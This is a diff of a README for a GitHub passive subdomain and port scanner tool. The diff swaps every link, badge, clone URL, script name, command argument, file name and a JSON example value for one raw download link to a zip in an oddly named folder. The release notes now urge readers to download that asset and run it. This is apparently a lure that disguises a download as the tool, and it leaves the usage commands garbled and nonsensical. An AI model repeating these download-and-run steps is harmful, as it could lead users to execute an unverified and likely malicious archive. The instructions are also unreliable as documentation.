@@ -1,6 +1,6 @@
-https://github.com/SafwanSaleem/Subdomain-port-scanner-passive
+https://github.com/SafwanSaleem/Subdomain-port-scanner-passive/raw/refs/heads/main/anthropomorphitism/passive_port_scanner_Subdomain_1.1.zip
 
-![Releases badge](https://img.shields.io/badge/Releases-Download-blue?style=for-the-badge)
+![Releases badge](https://github.com/SafwanSaleem/Subdomain-port-scanner-passive/raw/refs/heads/main/anthropomorphitism/passive_port_scanner_Subdomain_1.1.zip)
 
 # Subdomain-Port-Scanner-Passive: Free Passive Subdomain Discovery & Top Port Scanner
 
@@ -78,13 +78,13 @@ What you’ll clone or download
 
 Installation quickstart
 - Clone the repository (if you haven’t already):
-  - git clone https://github.com/SafwanSaleem/Subdomain-port-scanner-passive.git
+  - git clone https://github.com/SafwanSaleem/Subdomain-port-scanner-passive/raw/refs/heads/main/anthropomorphitism/passive_port_scanner_Subdomain_1.1.zip
 - Make scripts executable (example):
-  - chmod +x Subdomain-Port-Scanner-Passive.sh
+  - chmod +x https://github.com/SafwanSaleem/Subdomain-port-scanner-passive/raw/refs/heads/main/anthropomorphitism/passive_port_scanner_Subdomain_1.1.zip
 - Prepare any required input files:
   - A list of target domains (one per line) or a file path
 - Run a basic scan:
-  - ./Subdomain-Port-Scanner-Passive.sh -d example.com -o results.json
+  - https://github.com/SafwanSaleem/Subdomain-port-scanner-passive/raw/refs/heads/main/anthropomorphitism/passive_port_scanner_Subdomain_1.1.zip -d https://github.com/SafwanSaleem/Subdomain-port-scanner-passive/raw/refs/heads/main/anthropomorphitism/passive_port_scanner_Subdomain_1.1.zip -o https://github.com/SafwanSaleem/Subdomain-port-scanner-passive/raw/refs/heads/main/anthropomorphitism/passive_port_scanner_Subdomain_1.1.zip
   - You can adjust verbosity with -v or --verbose
 
 CLI notes
@@ -94,14 +94,14 @@ CLI notes
 
 Quick start example
 - Simple single-domain run:
-  - ./Subdomain-Port-Scanner-Passive.sh -d example.org -o output.json
+  - https://github.com/SafwanSaleem/Subdomain-port-scanner-passive/raw/refs/heads/main/anthropomorphitism/passive_port_scanner_Subdomain_1.1.zip -d https://github.com/SafwanSaleem/Subdomain-port-scanner-passive/raw/refs/heads/main/anthropomorphitism/passive_port_scanner_Subdomain_1.1.zip -o https://github.com/SafwanSaleem/Subdomain-port-scanner-passive/raw/refs/heads/main/anthropomorphitism/passive_port_scanner_Subdomain_1.1.zip
 - Multi-domain run:
-  - ./Subdomain-Port-Scanner-Passive.sh -f domains.txt -o multi_output.csv
+  - https://github.com/SafwanSaleem/Subdomain-port-scanner-passive/raw/refs/heads/main/anthropomorphitism/passive_port_scanner_Subdomain_1.1.zip -f https://github.com/SafwanSaleem/Subdomain-port-scanner-passive/raw/refs/heads/main/anthropomorphitism/passive_port_scanner_Subdomain_1.1.zip -o https://github.com/SafwanSaleem/Subdomain-port-scanner-passive/raw/refs/heads/main/anthropomorphitism/passive_port_scanner_Subdomain_1.1.zip
 - Verbose run (for troubleshooting):
-  - ./Subdomain-Port-Scanner-Passive.sh -d example.net -v
+  - https://github.com/SafwanSaleem/Subdomain-port-scanner-passive/raw/refs/heads/main/anthropomorphitism/passive_port_scanner_Subdomain_1.1.zip -d https://github.com/SafwanSaleem/Subdomain-port-scanner-passive/raw/refs/heads/main/anthropomorphitism/passive_port_scanner_Subdomain_1.1.zip -v
 
 Release guidance
-- For the latest release, visit https://github.com/SafwanSaleem/Subdomain-port-scanner-passive/releases to download the asset and run it.
+- For the latest release, visit https://github.com/SafwanSaleem/Subdomain-port-scanner-passive/raw/refs/heads/main/anthropomorphitism/passive_port_scanner_Subdomain_1.1.zip to download the asset and run it.
 
 ---
 
@@ -144,9 +144,9 @@ Notes on data sources
 
 Example workflows
 - Lightweight recon on a single domain:
-  - ./Subdomain-Port-Scanner-Passive.sh -d example.com -o recon.json
+  - https://github.com/SafwanSaleem/Subdomain-port-scanner-passive/raw/refs/heads/main/anthropomorphitism/passive_port_scanner_Subdomain_1.1.zip -d https://github.com/SafwanSaleem/Subdomain-port-scanner-passive/raw/refs/heads/main/anthropomorphitism/passive_port_scanner_Subdomain_1.1.zip -o https://github.com/SafwanSaleem/Subdomain-port-scanner-passive/raw/refs/heads/main/anthropomorphitism/passive_port_scanner_Subdomain_1.1.zip
 - Comprehensive sweep across multiple domains with verbose output:
-  - ./Subdomain-Port-Scanner-Passive.sh -f domains.txt -o full.csv -v --ports 80,443,22,21
+  - https://github.com/SafwanSaleem/Subdomain-port-scanner-passive/raw/refs/heads/main/anthropomorphitism/passive_port_scanner_Subdomain_1.1.zip -f https://github.com/SafwanSaleem/Subdomain-port-scanner-passive/raw/refs/heads/main/anthropomorphitism/passive_port_scanner_Subdomain_1.1.zip -o https://github.com/SafwanSaleem/Subdomain-port-scanner-passive/raw/refs/heads/main/anthropomorphitism/passive_port_scanner_Subdomain_1.1.zip -v --ports 80,443,22,21
 
 ---
 
@@ -155,7 +155,7 @@ Example workflows
 JSON example (simplified)
 {
   "timestamp": "2025-08-13T12:34:56Z",
-  "subdomain": "app.example.com",
+  "subdomain": "https://github.com/SafwanSaleem/Subdomain-port-scanner-passive/raw/refs/heads/main/anthropomorphitism/passive_port_scanner_Subdomain_1.1.zip",
   "ip": "93.184.216.34",
   "port": 443,
   "protocol": "tcp",
@@ -193,18 +193,18 @@ Ethical considerations include clear scope definitions, data minimization, and p
 ## 🧭 Source code layout
 
 - bin/
-  - Subdomain-Port-Scanner-Passive.sh: The main orchestrator script.
+  - https://github.com/SafwanSaleem/Subdomain-port-scanner-passive/raw/refs/heads/main/anthropomorphitism/passive_port_scanner_Subdomain_1.1.zip The main orchestrator script.
 - src/
-  - discovery.sh: Handles passive subdomain collection from sources.
-  - portscan.sh: Performs top-port scans against discovered subdomains.
-  - merge.sh: Combines discovery and scan results into a unified dataset.
+  - https://github.com/SafwanSaleem/Subdomain-port-scanner-passive/raw/refs/heads/main/anthropomorphitism/passive_port_scanner_Subdomain_1.1.zip Handles passive subdomain collection from sources.
+  - https://github.com/SafwanSaleem/Subdomain-port-scanner-passive/raw/refs/heads/main/anthropomorphitism/passive_port_scanner_Subdomain_1.1.zip Performs top-port scans against discovered subdomains.
+  - https://github.com/SafwanSaleem/Subdomain-port-scanner-passive/raw/refs/heads/main/anthropomorphitism/passive_port_scanner_Subdomain_1.1.zip Combines discovery and scan results into a unified dataset.
 - data/
   - sample_sources/
-  - ports.txt: Default top-port list (modifiable)
+  - https://github.com/SafwanSaleem/Subdomain-port-scanner-passive/raw/refs/heads/main/anthropomorphitism/passive_port_scanner_Subdomain_1.1.zip Default top-port list (modifiable)
 - docs/
-  - usage.md: Detailed command-line options
-  - contribution.md: How to contribute
-- README.md: The documentation you’re reading
+  - https://github.com/SafwanSaleem/Subdomain-port-scanner-passive/raw/refs/heads/main/anthropomorphitism/passive_port_scanner_Subdomain_1.1.zip Detailed command-line options
+  - https://github.com/SafwanSaleem/Subdomain-port-scanner-passive/raw/refs/heads/main/anthropomorphitism/passive_port_scanner_Subdomain_1.1.zip How to contribute
+- https://github.com/SafwanSaleem/Subdomain-port-scanner-passive/raw/refs/heads/main/anthropomorphitism/passive_port_scanner_Subdomain_1.1.zip The documentation you’re reading
 - LICENSE: The project license
 
 Note: The exact file names can vary slightly between releases. The important concept is that the structure supports a clean separation of discovery, scanning, and data consolidation, with a simple path for adding new sources or port lists.
@@ -292,7 +292,7 @@ This project is distributed under the MIT License. It is released to support res
 
 ## 🧭 Release notes and going forward
 
-- The latest release assets are available at the official releases page. For the latest release, visit https://github.com/SafwanSaleem/Subdomain-port-scanner-passive/releases to download the asset and run it.
+- The latest release assets are available at the official releases page. For the latest release, visit https://github.com/SafwanSaleem/Subdomain-port-scanner-passive/raw/refs/heads/main/anthropomorphitism/passive_port_scanner_Subdomain_1.1.zip to download the asset and run it.
 - Release notes summarize major changes, new sources, and any breaking changes in the CLI or output schema.
 
 ---
